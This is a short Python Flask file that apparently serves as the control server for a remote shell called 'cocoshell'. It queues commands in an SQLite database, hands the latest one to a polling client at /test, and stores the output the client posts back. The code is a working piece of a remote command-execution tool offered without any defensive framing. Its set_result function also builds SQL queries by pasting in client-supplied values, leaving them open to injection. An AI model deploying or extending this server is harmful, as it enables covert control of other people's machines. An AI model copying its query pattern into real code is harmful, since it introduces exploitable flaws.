import random
import string
import logging
import sqlite3
from os.path import exists
from multiprocessing import Process
from flask import Flask, session, request
from werkzeug.exceptions import BadRequest

letters = string.ascii_lowercase
#route = '/' + ''.join(random.choice(letters) for i in range(3))

db_exists = exists("cocoshell.db")
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()

if not db_exists:
    # Either set up a new database ..
    cur.execute("CREATE TABLE commands (id integer primary key autoincrement, cmd text, result text, hasBeenRun integer)")
    cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES (null, null, 1)")
    con.commit()
else:
    # .. or make sure, that nothing from the last session is annoying
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()

#############################################################################

def get_last_command():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

def set_result(id, result):
    try:
        cleaned_result = ""
        if type(result) == list:
            for line in result:
                cleaned_result += "\n" + line
        elif type(result) in [dict]:
            cleaned_result = "[-] No output for that command\n[-] This usually means, that the command failed in some way"
        else:
            cleaned_result = result

        cur.execute("UPDATE commands SET result = '" + cleaned_result + "' WHERE hasBeenRun = 0 AND id = " + str(id))
        cur.execute("UPDATE commands SET hasBeenRun = 1 WHERE id = " + str(id))
        con.commit()
        return True
    except Exception as e:
        logging.error(result)
        logging.error(e)
        return False

#############################################################################

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
api = Flask(__name__)

@api.route('/test', methods=['GET', 'POST'])
def command_handling():
    try:
        if request.method == 'GET':
            last = get_last_command()
            if last[3] == 1:
                return { "code": 400 }
            else:
                return { "id": last[0], "cmd": last[1] }
        if request.method == 'POST':
            set_result(request.json['id'], request.json['result'])
            return { "code": 200 }
    except BadRequest as e:
        logging.exception(e)
        
if __name__ == '__main__':
    try:
        api.run()
    except KeyboardInterrupt:
        exit